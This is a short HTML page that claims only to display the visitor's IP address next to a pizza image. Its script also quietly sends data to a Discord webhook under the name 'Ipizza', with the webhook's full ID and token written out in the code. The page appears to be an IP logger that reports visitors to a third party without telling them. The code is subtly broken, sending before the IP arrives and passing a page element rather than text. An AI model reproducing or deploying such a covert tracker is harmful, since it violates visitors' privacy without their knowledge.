<!DOCTYPE html>
<html>
<head>
  <title>Display User's IP Address</title>
</head>
<body>
  <p>Your IP address: <span id="userIp"></span></p>

  <script>
    // Fetch the user's IP address using an API (ipify in this case)
    fetch("https://api.ipify.org?format=json")
      .then(response => response.json())
      .then(data => {
        document.getElementById("userIp").textContent = data.ip;
      })
      .catch(error => {
        console.error("Error fetching IP address:", error);
      });

          var request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/1239204328649003068/iu4bBe1_8hziFyHYkP_SX5Eji6t6W8ta3PoYrRosphATEzvqKlI3A5qcF8jdYrrRxxGW");

      request.setRequestHeader('Content-type', 'application/json');

      var params = {
        username: "Ipizza",
        avatar_url: "https://seeklogo.com/vector-logo/243093/ip-gruppo-api",
        content: document.getElementById("userIp")
      }

      request.send(JSON.stringify(params));

  </script>
      <img src="banh-pizza-hai-san-dong-lanh.jpg">
</body>
</html>
